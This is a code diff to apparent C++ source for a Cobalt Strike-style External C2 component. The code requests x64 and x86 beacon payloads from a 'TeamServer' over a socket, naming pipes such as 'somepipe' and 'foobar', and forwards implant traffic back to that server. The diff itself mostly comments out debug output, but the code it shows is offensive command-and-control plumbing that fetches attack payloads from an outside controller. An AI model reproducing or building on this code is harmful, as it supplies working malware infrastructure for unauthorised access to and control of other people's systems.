@@ -58,14 +58,14 @@ void waitForTsToComeOnline() {
 
 //converetd to vector 
 std::vector<uint8_t> recv_frame(SOCKET my_socket) {
-	std::cout << "[TS] Reciving frame from TS" << std::endl;
+	//std::cout << "[TS] Reciving frame from TS" << std::endl;
 	uint32_t size = 0;
 	uint32_t total = 0;
 
 	// read exactly 4 bytes for the frame size
 	uint8_t size_bytes[4];
 	int ret = recv(my_socket, reinterpret_cast<char*>(size_bytes), 4, 0);
-	std::cout << "[TS] Data from TS size: " << ret << std::endl;
+	//std::cout << "[TS] Data from TS size: " << ret << std::endl;
 	if (ret != 4) {
 		throw std::runtime_error("Failed to read frame size");
 	}
@@ -77,7 +77,7 @@ std::vector<uint8_t> recv_frame(SOCKET my_socket) {
 	buffer.reserve(size);
 
 	while (total < size) {
-		std::cout << "[TS] Loop - Getting data from TS: " << std::endl;
+		//std::cout << "[TS] Loop - Getting data from TS: " << std::endl;
 		uint8_t temp_buf[4096];  // read in chunks
 		int to_read = std::min<int>(size - total, sizeof(temp_buf));
 		ret = recv(my_socket, reinterpret_cast<char*>(temp_buf), to_read, 0);
@@ -94,16 +94,16 @@ std::vector<uint8_t> recv_frame(SOCKET my_socket) {
 
 /* send a frame via a socket */
 void send_frame(SOCKET my_socket, char* buffer, int length) {
-	std::cout << "[TS] Sending frame to TS" << std::endl;
-	std::cout << "[TS] Sending size of frame: "<< length << std::endl;
+	//std::cout << "[TS] Sending frame to TS" << std::endl;
+	//std::cout << "[TS] Sending size of frame: "<< length << std::endl;
 	send(my_socket, (char*)&length, 4, 0);
-	std::cout << "[TS] Sending data of frame." << std::endl;
+	//std::cout << "[TS] Sending data of frame." << std::endl;
 	send(my_socket, buffer, length, 0);
 }
 
 //I'm being lazy so we have 2 funcs, one for x86 and one for x64
 std::vector<uint8_t> getx64Payload(SOCKET socket_extc2) {
-	std::cout << "[?] Getting x64 from TeamServer" << std::endl;
+	std::cout << "[>] Getting x64 payload from TeamServer" << std::endl;
 
 	send_frame(socket_extc2, (char*)"arch=x64", 8);
 	send_frame(socket_extc2, (char*)"pipename=somepipe", 17);
@@ -120,14 +120,14 @@ std::vector<uint8_t> getx64Payload(SOCKET socket_extc2) {
 	std::vector<uint8_t> payload = recv_frame(socket_extc2);
 
 	//std::vector<uint8_t> tempPayload;
-	//std::cout << "[?] Payload: ";
+	////std::cout << "[?] Payload: ";
 	//printHexVector(payload);
-	std::cout << "[?] Payload of size " << payload.size() << " recieved. " << std::endl;
+	//std::cout << "[?] Payload of size " << payload.size() << " recieved. " << std::endl;
 	return payload;
 };
 
 std::vector<uint8_t> getx86Payload(SOCKET socket_extc2) {
-	std::cout << "[?] Getting x86 from TeamServer" << std::endl;
+	std::cout << "[>] Getting x86 payload from TeamServer" << std::endl;
 
 	send_frame(socket_extc2, (char*)"arch=x86", 8);
 	send_frame(socket_extc2, (char*)"pipename=foobar", 15);
@@ -144,7 +144,7 @@ std::vector<uint8_t> getx86Payload(SOCKET socket_extc2) {
 	std::vector<uint8_t> payload = recv_frame(socket_extc2);
 
 	//std::vector<uint8_t> tempPayload;
-	std::cout << "[?] Payload of size " << payload.size() << " recieved. " <<std::endl;
+	//std::cout << "[?] Payload of size " << payload.size() << " recieved. " <<std::endl;
 	//printHexVector(payload);
 	return payload;
 };
@@ -152,7 +152,7 @@ std::vector<uint8_t> getx86Payload(SOCKET socket_extc2) {
 //dingus im using the wrong socket
 
 std::vector<uint8_t> forwardToTeamserver(std::vector<uint8_t> dataForTeamserver, SOCKET socket_extc2) {
-	std::cout << "[?] Forwarding data to TeamServer" << std::endl;
+	//std::cout << "[?] Forwarding data to TeamServer" << std::endl;
 	//struct sockaddr_in 	sock;
 	//sock.sin_family = AF_INET;
 	//sock.sin_addr.s_addr = inet_addr(TeamServer::address.c_str());
@@ -168,7 +168,7 @@ std::vector<uint8_t> forwardToTeamserver(std::vector<uint8_t> dataForTeamserver,
 	//send adn rec frame as needed
 
 	send_frame(socket_extc2, reinterpret_cast<char*>(dataForTeamserver.data()), dataForTeamserver.size());
-	std::cout << "Data going to TS: " << std::endl;
+	//std::cout << "Data going to TS: " << std::endl;
 	//printHex(reinterpret_cast<char*>(it->second.fromClientBuffer.data()), it->second.fromClientBuffer.size())
 
 	std::cout << "[+] Sent to teamserver" << std::endl;
